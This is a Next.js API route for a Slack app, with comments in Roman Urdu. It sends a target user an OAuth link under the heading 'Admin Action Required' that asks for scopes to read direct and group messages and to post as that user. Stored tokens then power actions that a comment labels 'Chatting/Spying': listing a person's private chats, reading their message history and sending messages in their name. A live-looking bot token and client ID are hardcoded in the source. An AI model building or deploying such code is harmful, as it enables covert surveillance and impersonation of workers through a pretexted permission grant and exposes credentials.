/* eslint-disable @typescript-eslint/no-explicit-any */
import { NextResponse } from 'next/server';
import { db } from '@/lib/firebase';
import { doc, getDoc } from 'firebase/firestore';

// 👇 YAHAN APNI ASAL KEYS DALAIN
const BOT_TOKEN = "xoxb-10369585956705-10354644583366-EZlwC8OK1NTuHVU6cAOqTQV1"; 
const CLIENT_ID = "10369585956705.10360275949988"; // Basic Information page se copy karein

// 👇 Vercel URL
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text } = body;

    // --- CASE 1: Send Invite Link ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID is missing" });

       const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const msg = `👋 *Admin Action Required*\nDashboard integration ke liye permission required hai.\n👇 *Is link par click kar ke Allow karein:*\n${authLink}`;

       // DM Open karna
       const openRes = await fetch('https://slack.com/api/conversations.open', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ users: targetUserId })
       });
       const openData = await openRes.json();
       
       if(!openData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${openData.error}` });

       // Message Bhejna
       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: openData.channel.id, text: msg })
       });

       return NextResponse.json({ success: true });
    }

    // --- Baki Actions (Chatting/Spying) ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });

    const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
    if (!tokenDoc.exists()) {
        return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
    }
    
    const USER_TOKEN = tokenDoc.data().accessToken;

    if (action === 'list_chats') {
        const res = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=30', {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const data = await res.json();
        
        const chats = await Promise.all((data.channels || []).map(async (c: any) => {
            if(c.is_im) {
                const uRes = await fetch(`https://slack.com/api/users.info?user=${c.user}`, {
                    headers: { Authorization: `Bearer ${USER_TOKEN}` }
                });
                const uData = await uRes.json();
                return { ...c, name: uData.user?.real_name || "Unknown", image: uData.user?.profile?.image_48 };
            }
            return { ...c, name: "Group Chat", image: null };
        }));
        
        return NextResponse.json({ chats });
    }

    if (action === 'get_messages') {
        const res = await fetch(`https://slack.com/api/conversations.history?channel=${channelId}&limit=50`, {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const data = await res.json();
        return NextResponse.json({ messages: data.messages?.reverse() || [] });
    }

    if (action === 'send_as_user') {
        const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: e.message }, { status: 500 });
  }
}